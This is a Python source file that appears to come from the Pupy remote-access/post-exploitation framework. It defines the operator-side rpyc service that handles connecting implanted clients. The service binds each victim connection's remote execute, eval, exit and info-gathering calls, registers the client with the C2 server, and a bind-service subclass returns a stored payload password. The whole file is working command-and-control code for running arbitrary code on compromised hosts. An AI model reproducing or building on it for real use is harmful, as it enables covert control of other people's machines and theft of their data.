# -*- coding: utf-8-*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import rpyc.core.service
import rpyc
import threading
import sys
import ssl
import logging
import traceback
import json
import zlib
import msgpack

from pupylib.PupyCredentials import Credentials

class PupyService(rpyc.Service):
    def __init__(self, *args, **kwargs):
        super(PupyService, self).__init__(*args, **kwargs)
        self._local_cleanups = []
        self._singles = {}

    def on_connect(self):
        try:
            # code that runs when a connection is created
            # (to init the serivce, if needed)
            self._conn._config.update(dict(
                allow_safe_attrs = True,
                allow_public_attrs = False,
                allow_pickle = False,
                allow_getattr = True,
                allow_setattr = False,
                allow_delattr = False,
                import_custom_exceptions = False,
                instantiate_custom_exceptions = False,
                instantiate_oldstyle_exceptions = False,
            ))
            #self._conn._config["safe_attrs"].add("__iter__")
            #self._conn._config["safe_attrs"].add("readline")
            self.modules=None

            #some aliases :
            try:
                self.namespace=self._conn.root.namespace
            except Exception:
                if logging.getLogger().getEffectiveLevel()==logging.DEBUG:
                    raise
                else:
                    return

            self.execute=self._conn.root.execute
            self.register_remote_cleanup=self._conn.root.register_cleanup
            self.unregister_remote_cleanup=self._conn.root.unregister_cleanup
            self.exit=self._conn.root.exit
            self.eval=self._conn.root.eval
            self.get_infos=self._conn.root.get_infos
            self.builtin=self.modules.__builtin__
            self.builtins=self.modules.__builtin__
            self.exposed_stdin=sys.stdin
            self.exposed_stdout=sys.stdout
            self.exposed_stderr=sys.stderr
            self.pupy_srv.add_client(self)
        except Exception as e:
            logging.error(traceback.format_exc())

    def register_local_cleanup(self, cleanup):
        self._local_cleanups.append(cleanup)

    def unregister_local_cleanup(self, cleanup):
        self._local_cleanups.remove(cleanup)

    def single(self, ctype, *args, **kwargs):
        single = self._singles.get(ctype)
        if not single:
            single = ctype(*args, **kwargs)
            self._singles[ctype] = single

        return single

    def on_disconnect(self):
        self.pupy_srv.remove_client(self)
        for cleanup in self._local_cleanups:
            cleanup()

    def exposed_set_modules(self, modules):
        self.modules = modules

    def exposed_msgpack_dumps(self, js, compressed=False):
        print "msgpack dumps"
        data = msgpack.dumps(js)
        if compressed:
            data = zlib.compress(data)

        return data

    def exposed_json_dumps(self, js, compressed=False):
        print "json dumps"
        data = json.dumps(js)
        if compressed:
            data = zlib.compress(data)

        return data

class PupyBindService(PupyService):
    def exposed_get_password(self):
        credentials = Credentials()
        return credentials['BIND_PAYLOADS_PASSWORD']
